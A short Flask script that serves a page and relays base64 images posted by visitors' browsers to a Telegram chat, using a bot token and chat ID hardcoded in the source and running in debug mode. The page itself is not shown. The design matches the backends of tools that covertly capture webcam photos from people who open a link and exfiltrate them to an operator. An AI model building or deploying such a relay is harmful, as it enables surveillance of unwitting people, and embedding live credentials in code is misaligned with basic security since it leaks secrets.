from flask import Flask, request, send_from_directory
import base64, requests

app = Flask(__name__)

BOT_TOKEN = "8542816540:AAH7Qg9v3YN2OSWc3Sx1QxLXqxLQyQYCfUk"
CHAT_ID = "5053114440"

@app.route("/")
def home():
    return send_from_directory(".", "index.html")

@app.route("/send", methods=["POST"])
def send():
    try:
        img = request.json["image"]
        img_bytes = base64.b64decode(img.split(",")[1])

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        r = requests.post(
            url,
            data={"chat_id": CHAT_ID},
            files={"photo": img_bytes}
        )

        print("Sent:", r.status_code)
        return "OK"
    except Exception as e:
        print("ERROR:", e)
        return "ERROR", 500

if __name__ == "__main__":
    app.run(debug=True)
